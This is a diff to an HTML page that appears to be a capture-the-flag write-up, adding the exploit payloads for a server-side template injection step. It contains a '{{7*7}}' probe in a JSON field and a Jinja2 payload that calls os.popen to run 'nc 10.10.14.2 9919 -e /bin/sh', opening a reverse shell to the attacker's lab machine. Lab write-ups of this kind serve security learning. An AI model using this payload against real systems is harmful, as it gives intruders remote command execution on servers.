@@ -294,7 +294,7 @@ aria_log_control   ib_buffer_pool    ib_logfile0  ibtmp1       mysql		  performa
 
 <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
   </span><span class="nl">"sitename"</span><span class="p">:</span><span class="w"> </span><span class="s2">"anything"</span><span class="p">,</span><span class="w">
-  </span><span class="nl">"siteurl"</span><span class="p">:</span><span class="s2">""</span><span class="w">
+  </span><span class="nl">"siteurl"</span><span class="p">:</span><span class="s2">"{{7*7}}"</span><span class="w">
 </span><span class="p">}</span><span class="w">
 </span></code></pre></div></div>
 <p>Assuming the rest of the http request is correct (likely have to change content-type to <code class="language-plaintext highlighter-rouge">application/json</code>), this returns:</p>
@@ -303,7 +303,7 @@ aria_log_control   ib_buffer_pool    ib_logfile0  ibtmp1       mysql		  performa
 
 <p>So the SSTI works. Using a reverse shell payload (I initially used <code class="language-plaintext highlighter-rouge">/bin/bash</code> but had errors which <code class="language-plaintext highlighter-rouge">sh</code> seemed to solve):</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{{</span> <span class="n">request</span><span class="p">[</span><span class="s">'application'</span><span class="p">][</span><span class="s">'__globals__'</span><span class="p">][</span><span class="s">'__builtins__'</span><span class="p">][</span><span class="s">'__import__'</span><span class="p">](</span><span class="s">'os'</span><span class="p">)[</span><span class="s">'popen'</span><span class="p">](</span><span class="s">'nc 10.10.14.2 9919 -e /bin/sh'</span><span class="p">)[</span><span class="s">'read'</span><span class="p">]()</span> <span class="p">}}</span> 
 </code></pre></div></div>
 
 <h2 id="www-data-to-jennifer">
